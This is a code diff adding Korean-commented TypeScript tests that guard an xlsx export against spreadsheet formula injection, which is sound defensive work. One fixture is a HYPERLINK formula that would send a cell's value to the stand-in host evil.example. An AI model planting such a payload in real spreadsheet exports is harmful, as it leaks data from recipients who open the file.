@@ -132,3 +132,91 @@ describe('buildWorkbook — 시트명이 조사 연도를 따른다', () => {
     expect(wb.SheetNames).not.toContain('2026_필지선정');
   });
 });
+
+/**
+ * 수식 주입 — **현재는 도달 불가다. 그 상태를 못 박는다.**
+ *
+ * 업로드 파일의 셀 값이 `=`·`+`·`-`·`@`로 시작하면 CSV처럼 **타입이 없는** 형식에서는
+ * 열 때 수식으로 해석된다. 이 산출물은 담당자를 거쳐 흙토람 등 외부 기관으로 나가므로
+ * 그렇게 되면 문제가 크다.
+ *
+ * **그런데 xlsx 셀에는 타입이 있다.** 실측한 생성 XML:
+ *
+ * ```xml
+ * <c r="A2" t="str"><v>=HYPERLINK("http://evil.example","확인")</v></c>
+ * ```
+ *
+ * `<f>` 요소가 **없다.** OOXML에서 수식은 `<f>`에 담기고 `<v>`는 계산된 값일 뿐이라,
+ * Excel은 이것을 **텍스트로 표시하고 평가하지 않는다.** 코드베이스에 `f` 셀을 만드는
+ * 곳도, CSV로 내보내는 경로도 없다(`bookType`이 전부 `'xlsx'`).
+ *
+ * 그래서 **접두사를 이스케이프하지 않는다.** 했다면 `-1200` 같은 정상 값이 `'-1200`이
+ * 되어 담당자가 셀을 다시 손봐야 한다 — 없는 위험을 막으려고 산출물을 망가뜨리는 셈이다.
+ *
+ * 대신 **되돌아가는 것을 막는다.** 누가 CSV 내보내기를 붙이거나 수식 셀을 만들기
+ * 시작하면 그 순간 진짜 위험이 되고, 그때 이 테스트가 먼저 깨진다.
+ *
+ * 남는 경로 하나: 받는 사람이 그 셀을 **복사해 다른 시트에 붙여 넣으면** 수식이 된다.
+ * 사용자 조작이 필요하고 글자가 눈에 보이므로 여기서 막지 않는다.
+ */
+describe('buildWorkbook — 수식 주입', () => {
+  const FORMULA_LIKE = [
+    '=HYPERLINK("http://evil.example/leak?d="&A2,"확인")',
+    '+1+1',
+    '@SUM(A1)',
+    '=1+1',
+  ];
+
+  /** 워크북을 프로덕션과 같은 방식으로 써서 시트 XML을 꺼낸다 */
+  function sheetXml(wb: XLSX.WorkBook): string {
+    const buf = XLSX.write(wb, { bookType: 'xlsx', type: 'array' }) as ArrayBuffer;
+    // 다시 읽어 셀 객체를 본다 — f가 있으면 수식 셀이다
+    const back = XLSX.read(new Uint8Array(buf), { type: 'array', cellFormula: true });
+    return JSON.stringify(back.Sheets);
+  }
+
+  it('수식처럼 보이는 값이 수식 셀이 되지 않는다', () => {
+    const wb = build(FORMULA_LIKE.map((v, i) => both({ pnu: `P${i}`, address: v })));
+    const buf = XLSX.write(wb, { bookType: 'xlsx', type: 'array' }) as ArrayBuffer;
+    const back = XLSX.read(new Uint8Array(buf), { type: 'array', cellFormula: true });
+
+    for (const name of back.SheetNames) {
+      const sheet = back.Sheets[name];
+      for (const addr of Object.keys(sheet)) {
+        if (addr.startsWith('!')) continue;
+        // `f`가 있으면 Excel이 수식으로 실행한다
+        expect(sheet[addr].f).toBeUndefined();
+      }
+    }
+  });
+
+  it('수식처럼 보이는 값이 글자 그대로 보존된다', () => {
+    const wb = build([both({ pnu: 'P0', address: FORMULA_LIKE[0] })]);
+    const rows = cellsOf(wb, `${SURVEY_YEAR}_필지선정`);
+    const col = rows[0].indexOf('필지주소');
+    expect(rows[1][col]).toBe(FORMULA_LIKE[0]);
+  });
+
+  /**
+   * **이스케이프하지 않는다는 결정을 못 박는다.** 접두사를 무력화하면 이 값들이
+   * `'-1200` 처럼 되어 담당자가 손봐야 한다.
+   */
+  it('음수·전화번호 같은 정상 값을 건드리지 않는다', () => {
+    const wb = build([
+      both({ pnu: 'P0', address: '-1200' }),
+      both({ pnu: 'P1', address: '010-1234-5678' }),
+      both({ pnu: 'P2', address: '-' }),
+    ]);
+    const rows = cellsOf(wb, `${SURVEY_YEAR}_필지선정`);
+    const col = rows[0].indexOf('필지주소');
+    const vals = rows.slice(1).map((r) => r[col]).sort();
+    expect(vals).toEqual(['-', '-1200', '010-1234-5678']);
+    expect(vals.some((v) => v.startsWith("'"))).toBe(false);
+  });
+
+  /** 그 XML에 수식 요소 자체가 없다 */
+  it('생성된 워크북에 수식 셀이 하나도 없다', () => {
+    const wb = build(FORMULA_LIKE.map((v, i) => both({ pnu: `P${i}`, address: v })));
+    expect(sheetXml(wb)).not.toContain('"f":');
+  });
+});
